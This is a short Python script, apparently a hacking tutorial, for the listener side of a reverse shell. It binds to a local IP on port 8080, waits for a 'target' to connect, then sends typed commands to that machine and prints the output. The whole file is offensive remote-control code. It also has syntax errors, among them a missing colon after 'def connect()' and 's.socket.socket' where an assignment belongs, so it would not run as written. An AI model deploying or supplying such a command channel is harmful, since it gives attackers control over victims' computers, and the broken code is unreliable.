#import required modules

import socket #for building TCP connection
import os

os.system("clear || cls")
def connect()
	s.socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	s.bind(("192.168.88.251", 8080)) #define the IP address  and the listening pot 
	
	s.listen(1) #for listining from single connection so make it one 

	print('[+] Listening for incoming Tcp connection on port 8080')
	conn, addr = s.accept() # accept() function will  return the connection object ID (conn) and will return the clients(target) ip address and source 

	print('[+] We got a connection from:', addr)

	ter = 'terminate'

	while True:
		command = input("\nShell>") #get =s the user input and store it in  command variable
		if ter in command: #if we type ter command , then close the connection 
			conn.send(ter.encode('utf-8'))
			conn.close()
			break
		else: 
			conn.send(str.encode(command)) #here we will send the command to the target 
			client =str(conn.recv(1024).decode("utf-8"))
			print(client) #and prints the result that we got back

def main():
	connect()
main()
